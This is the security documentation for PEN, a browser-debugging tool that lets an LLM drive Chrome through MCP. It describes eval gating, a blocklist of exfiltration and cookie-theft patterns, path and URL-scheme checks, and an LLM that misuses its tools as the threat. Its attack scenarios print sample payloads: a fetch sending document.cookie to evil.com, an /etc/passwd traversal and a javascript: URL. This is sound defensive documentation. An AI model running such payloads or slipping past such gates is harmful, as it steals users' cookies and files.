# Security

PEN sits at the intersection of CDP (full browser control), MCP (LLM-driven tool execution), and the local file system. Each boundary is hardened.

## Overview

| Boundary          | Threat                               | Defense                                            |
| ----------------- | ------------------------------------ | -------------------------------------------------- |
| MCP ← LLM         | Malicious eval, read sensitive files | Eval gating, expression blocklist, path validation |
| MCP ← LLM         | Navigate to dangerous URLs           | URL scheme validation                              |
| PEN → Chrome      | Full browser access                  | Localhost-only CDP                                 |
| PEN → File System | Temp files, path traversal           | Temp dir isolation, path checks                    |
| PEN → Network     | Source map fetching                  | Not implemented (by design)                        |

An LLM connected via MCP can call any registered PEN tool with arbitrary parameters. The gates below prevent misuse.

## Gate 1: Eval Gating

`pen_evaluate` is the most dangerous tool — it executes JavaScript in the browser.

**Default: disabled.** The tool is only registered if `--allow-eval` is passed at startup. Without it, the tool doesn't appear in `tools/list` and cannot be called.

## Gate 2: Expression Blocklist

Even with `--allow-eval`, PEN blocks dangerous patterns:

| Pattern                | What it blocks            |
| ---------------------- | ------------------------- |
| `fetch(`               | Network exfiltration      |
| `XMLHttpRequest`       | Network exfiltration      |
| `navigator.sendBeacon` | Data beaconing            |
| `localStorage`         | Persistent storage access |
| `sessionStorage`       | Session storage access    |
| `document.cookie`      | Cookie theft              |
| `window.open(`         | Popup/redirect abuse      |
| `eval(`                | Dynamic code execution    |
| `Function(`            | Dynamic code execution    |
| `import(`              | Dynamic module loading    |

Additionally, Unicode escape sequences (`\uXXXX`) are rejected to prevent blocklist bypass.

> This is defense-in-depth, not a security boundary. A determined attacker can bypass regex filters. The real security is Gate 1 (not enabling eval at all).

## Gate 3: Path Traversal Prevention

Source tools accept file paths. `ValidateSourcePath` prevents traversal:

- Resolves the path to an absolute path
- Checks it's within the project root using `filepath.Rel`
- Handles case-insensitive filesystems and mixed separators
- Rejects any path that resolves outside the root

Temp files are validated separately — must be within `os.TempDir()/pen/`.

## Gate 4: CDP Localhost Restriction

PEN only connects to localhost (`localhost`, `127.0.0.1`, `::1`). Any other host is rejected at startup before the MCP server starts.

For remote browsers, use SSH tunneling:

```bash
ssh -L 9222:localhost:9222 user@remote-server
pen --cdp-url http://localhost:9222
```

## Gate 5: URL Scheme Validation

`pen_navigate` and `pen_lighthouse` validate URLs before any action:

| Blocked Scheme       | Reason                       |
| -------------------- | ---------------------------- |
| `javascript:`        | Arbitrary code execution     |
| `data:`              | Can render arbitrary content |
| `file:`              | Local file system access     |
| `chrome:` / `about:` | Internal browser pages       |
| `ftp:`               | Unencrypted protocol         |
| `ws:` / `wss:`       | WebSocket connections        |
| `blob:`              | In-memory content            |
| `vbscript:`          | Legacy script execution      |

Only `http:` and `https:` are allowed.

## Gate 6: Rate Limiting

Heavy tools have cooldowns to prevent resource exhaustion:

| Tool                  | Cooldown |
| --------------------- | -------- |
| `pen_heap_snapshot`   | 10s      |
| `pen_capture_trace`   | 5s       |
| `pen_collect_garbage` | 5s       |

## Gate 7: Temp File Isolation

- Directory: `os.TempDir()/pen/` with `0700` permissions
- Files: `0600` permissions (owner-only read/write)
- Cleaned up on normal exit and on context cancellation via `defer`

## Gate 8: HTTP Transport

When using HTTP mode:

- Default bind: `localhost:6100` — not exposed to network
- Warning logged if binding to all interfaces
- No built-in auth — for network exposure, use a reverse proxy with auth

## Attack Scenarios

### LLM tries to exfiltrate data via eval

```json
{ "expression": "fetch('https://evil.com?d=' + document.cookie)" }
```

1. **Default:** Tool doesn't exist. MCP returns "unknown tool."
2. **With `--allow-eval`:** Blocked by expression filter (`fetch(` pattern).
3. **Obfuscated:** Regex may miss this — which is why Gate 1 (not enabling eval) is the real defense.

### Path traversal via source tools

```json
{ "urlPattern": "../../../../etc/passwd" }
```

`ValidateSourcePath` resolves to `/etc/passwd`, checks it against the project root, rejects with "path resolves outside project root."

### Rapid-fire heavy tool calls

```
pen_heap_snapshot → success
pen_heap_snapshot → blocked (cooldown: 10s)
```

### Remote CDP connection attempt

```bash
pen --cdp-url ws://attacker.com:9222/devtools/browser
```

Rejected at startup. PEN exits before the MCP server starts.

### Malicious navigation

```json
{ "url": "javascript:alert(document.cookie)", "action": "goto" }
```

Blocked immediately. The `javascript:` scheme is not allowed. Navigation never reaches the browser.

## Security Checklist

| Control                                     | Status |
| ------------------------------------------- | ------ |
| `pen_evaluate` requires `--allow-eval`      | ✅     |
| Expression blocklist + Unicode escape check | ✅     |
| Path traversal prevention (source paths)    | ✅     |
| Path traversal prevention (temp paths)      | ✅     |
| CDP restricted to localhost                 | ✅     |
| URL scheme validation (navigate/lighthouse) | ✅     |
| Temp files: 0600 perms, isolated dir        | ✅     |
| Temp files cleaned on exit                  | ✅     |
| Rate limiting on heavy operations           | ✅     |
| HTTP binds to localhost by default          | ✅     |
| Graceful shutdown on SIGINT/SIGTERM         | ✅     |

## Recommendations

- **Never enable `--allow-eval` in production** or untrusted environments
- **Always set `--project-root`** to limit source tool access
- **Never expose port 9222** to the network
- **Use SSH tunneling** for remote browsers
- **Use a reverse proxy with auth** if exposing PEN's HTTP transport
